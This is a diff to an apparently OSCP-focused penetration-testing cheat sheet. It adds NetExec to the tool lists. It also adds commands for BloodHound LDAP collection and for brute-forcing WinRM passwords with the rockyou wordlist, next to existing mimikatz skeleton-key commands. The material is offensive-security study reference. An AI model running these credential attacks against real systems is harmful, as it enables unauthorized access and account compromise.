@@ -115,6 +115,7 @@ Thank you for reading.
 		- [Kerbrute](https://github.com/0xsyr0/OSCP#kerbrute)
 		- [LaZagne](https://github.com/0xsyr0/OSCP#lazagne)
 		- [mimikatz](https://github.com/0xsyr0/OSCP#mimikatz)
+  		- [NetExec](https://github.com/0xsyr0/OSCP#NetExec)
 		- [pypykatz](https://github.com/0xsyr0/OSCP#pypykatz)
 	- [Exploitation Tools](https://github.com/0xsyr0/OSCP#exploitation-tools-1)
 		- [ImageTragick](https://github.com/0xsyr0/OSCP#imagetragick)
@@ -246,6 +247,7 @@ Thank you for reading.
 | Kerbrute | https://github.com/ropnop/kerbrute |
 | LaZagne | https://github.com/AlessandroZ/LaZagne |
 | mimikatz | https://github.com/gentilkiwi/mimikatz |
+| NetExec | https://github.com/Pennyw0rth/NetExec |
 | Patator | https://github.com/lanjelot/patator |
 | pypykatz | https://github.com/skelsec/pypykatz |
 | RsaCtfTool | https://github.com/Ganapati/RsaCtfTool |
@@ -2567,6 +2569,13 @@ privilege::debug
 misc::skeleton
 net use C:\\<RHOST>\admin$ /user:Administrator mimikatz
 dir \\<RHOST>\c$ /user:<USERNAME> mimikatz
+```
+
+#### NetExec
+
+```c
+netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c all
+netexec winrm <RHOST> -u '<USERNAME>' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
 ```
 
 #### pypykatz
